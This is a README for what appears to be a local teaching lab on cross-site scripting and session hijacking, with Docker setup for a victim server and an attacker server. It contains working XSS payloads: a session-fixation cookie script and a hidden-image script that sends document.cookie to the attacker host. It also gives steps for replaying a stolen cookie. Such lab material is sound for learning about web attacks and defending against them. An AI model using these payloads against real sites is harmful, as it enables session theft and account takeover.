# Quick Start

`docker-compose` up in `docker` folder

## Entrypoints

- Victim: `http://localhost:3000`
- Attacker: See Docker Logs

# Payloads

## XSS Check

Simple check to verify XSS is working:

### Check for session fixation

Login with: `admin` `istrator`

enter

`<script>document.cookie='connect.sid=12345;path=/'</script>`

if you are logged out, XSS is possible.

## Session Hijacking / get Cookies

### By Hidden Image

```
<script>img = document.createElement("img");img.src = "http://localhost/"+document.cookie;img.style.display = "none";x = document.getElementsByTagName("BODY")[0];x.appendChild(img);</script>
```
Goto other Browser:

e.g. Firefox:

- Web-Store
- Cookies
- Setup Path and value
- Call http://localhost:3000/sessionxss/protected

# Configuration in more Detail

## Docker 

### Single Docker Builds

#### Victim Server

goto `docker/victimserver` folder

`docker build -t sessionvictimserver .`
`docker run -ti --rm -p 127.0.0.1:3000:3000 sessionvictimserver`

visit [http://localhost:3000/sessionxss/login](http://localhost:3000/sessionxss/login)

#### Attacker Server

- goto `docker/attackerserver` folder
- run `docker build -t xss_attack_server .`
- run `docker run --rm -ti -p 127.0.0.1:80:80 xss_attack_server .`

## Just Code 

### Attacker Server
goto `docker/attackerserver/serverfiles`

### Victim Server
goto `docker/victimserver/files`

### Execution

- run: `node index.js`
- goto: `http://localhost:3000/sessionxss/login`